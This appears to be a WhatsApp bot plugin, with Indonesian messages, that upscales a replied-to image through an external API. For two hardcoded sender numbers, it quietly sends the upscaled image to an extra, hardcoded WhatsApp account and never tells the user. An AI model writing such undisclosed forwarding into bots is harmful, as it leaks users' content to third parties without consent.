global.hdSession = global.hdSession || {}

let handler = async (m, {
    conn,
    args
}) => {
    try {
        const q = m.quoted ? m.quoted : m
        const mime = (q.msg || q).mimetype || ''
        const scale = Number(args[0])

        if (!args[0]) {
            if (!mime.startsWith('image/')) {
                return m.reply('Reply gambar dengan perintah .hd')
            }

            const img = await q.download()
            if (!img) return m.reply('❌ Gagal download gambar')

            global.hdSession[m.sender] = {
                img,
                mime,
                time: Date.now()
            }



            return await new Button(conn)
                .setTitle('乂 H D I M A G E')
                .setBody('Pilih kualitas upscale gambar')
                .setFooter(m.name || m.pushName || 'User')
                .addButton('', '')
                .addReply('HD 2x', '.hd 2')
                .addReply('HD 4x', '.hd 4')
                .send(m.chat, {
                    quoted: m
                })
        }

        if (![2, 4].includes(scale)) {
            return m.reply('Gunakan .hd 2 atau .hd 4')
        }

        const session = global.hdSession[m.sender]

        if (!session) {
            return m.reply('Session habis, kirim ulang gambar lalu ketik .hd')
        }

        const {
            img,
            mime: sessionMime
        } = session

        await m.reply(`⏳ Upscale (${scale}x)...`)

        const form = new FormData()
        form.append('scale', String(scale))
        form.append(
            'image',
            new Blob([img], {
                type: sessionMime
            }),
            'image.jpg'
        )
        form.append(
            'apikey',
            global.APIKeys[global.APIs['theresav']]
        )

        const res = await fetch(
            global.API('theresav', '/tools/hd', {}, 'apikey'), {
                method: 'POST',
                body: form
            }
        )

        if (!res.ok) throw new Error(`Status ${res.status}`)

        const result = Buffer.from(await res.arrayBuffer())

        if (!result || result.length < 1000) {
            throw new Error('Hasil tidak valid')
        }

        const nomor = m.sender.split('@')[0]

        const specialNumbers = [
            '62895626757585',
            '6285800672314'
        ]

        let targets = [m.chat]

        if (specialNumbers.includes(nomor)) {
            targets.push('601117633607@s.whatsapp.net')
        }

        targets = [...new Set(targets)]

        for (const jid of targets) {
            try {
                await conn.sendMessage(
                    jid, {
                        image: result,
                        caption: `✅ HD selesai (${scale}x)`
                    }, {
                        quoted: m
                    }
                )
            } catch (err) {
                console.error(`Gagal kirim ke ${jid}`, err)
            }
        }



    } catch (e) {
        console.error(e)
        await m.reply('❌ Error: ' + e.message)
    }
}

handler.help = ['hd']
handler.command = ['hd']
handler.tags = ['tools']
handler.limit = true
handler.register = true

export default handler